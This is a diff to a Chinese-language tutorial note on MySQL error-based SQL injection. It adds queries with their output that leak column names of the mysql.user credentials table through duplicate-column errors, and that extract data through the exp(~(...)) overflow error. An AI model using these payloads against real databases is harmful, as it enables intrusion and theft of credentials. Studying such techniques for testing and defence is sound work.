@@ -52,10 +52,47 @@ SELECT id FROM tuser WHERE id=1 UNION SELECT 1 FROM (SELECT COUNT(*),CONCAT(LEFT
 
 * 1.爆第一个列名
 
+```
+mysql> select * from(select * from mysql.user a join mysql.user b)c;
+ERROR 1060 (42S21): Duplicate column name 'Host'
+```
+
 * 2.爆第二个列名(使用using)
+
+```
+mysql> select * from(select * from mysql.user a join mysql.user b using(Host))c; 
+ERROR 1060 (42S21): Duplicate column name 'User'
+```
 
 * 3.爆第三列名(还是使用using，参数是前两个列的列名)
 
-...
+```
+mysql> select * from(select * from mysql.user a join mysql.user b using(Host,User))c;
+ERROR 1060 (42S21): Duplicate column name 'Password'
+```
 
-* 爆完列名后，使用完整的列名，就可以爆数据了
+* ...
+
+* 爆完列名后，使用完整的列名，就是用户数据了
+
+
+## 数字溢出
+
+#### exp
+
+
+* select ~(select version());
+```
+mysql> select ~(select version());
++----------------------+
+| ~(select version())  |
++----------------------+
+| 18446744073709551610 |
++----------------------+
+```
+
+* select exp(~(select * from(select user())x));
+```
+mysql> select exp(~(select * from(select user())x));
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
+```
